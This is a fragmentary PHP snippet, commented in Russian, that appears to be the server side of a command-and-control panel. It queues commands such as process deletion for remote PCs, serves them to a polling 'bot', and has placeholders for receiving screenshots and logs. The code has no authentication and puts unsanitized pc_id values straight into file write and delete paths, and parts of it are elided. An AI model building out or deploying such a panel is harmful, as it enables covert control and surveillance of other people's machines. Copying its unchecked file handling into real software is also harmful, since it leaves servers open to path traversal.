<?php
header("Cache-Control: no-cache, must-revalidate");
// ... (оставляем настройки $csvUrl, $googleExecUrl как были)

// 1. УЛУЧШЕННАЯ ОБРАБОТКА КОМАНД
if (isset($_POST['send_cmd'])) {
    $pc_id = $_POST['pc_id'];
    $cmd = $_POST['cmd'];
    if ($cmd == 'delete' && !empty($_POST['proc_name'])) $cmd .= " " . $_POST['proc_name'];
    file_put_contents("cmd_{$pc_id}.txt", $cmd);
    header("Location: " . $_SERVER['PHP_SELF']); exit;
}

// 2. РУЧНАЯ ОЧИСТКА (Добавлено)
if (isset($_POST['clear_manual'])) {
    @unlink("cmd_" . $_POST['pc_id'] . ".txt");
    header("Location: " . $_SERVER['PHP_SELF']); exit;
}

// ... (оставляем логику приема скриншотов и логов как была)

// 3. ОТДАЧА КОМАНД (Модернизировано: отдаем и сразу удаляем для чистоты)
if (isset($_GET['get_cmd'])) { 
    $file = "cmd_{$_GET['pc_id']}.txt"; 
    if (file_exists($file)) {
        echo file_get_contents($file);
        @unlink($file); // Удаляем команду СРАЗУ при получении ботом
    } else {
        echo "none";
    }
    exit; 
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Панель Управления</title>
    <meta http-equiv="refresh" content="10">
    <style>
        /* ... (оставляем твои стили, добавляем кнопку сброса) ... */
        .btn-clear { background: #64748b; color: white; margin-top: 5px; }
    </style>
</head>
<body>
    <form method="post">
        <input type="hidden" name="pc_id" value="<?= htmlspecialchars($ip) ?>">
        <button type="submit" name="clear_manual" class="btn btn-clear">🔄 Очистить очередь команд</button>
    </form>
    
    </body>
</html>
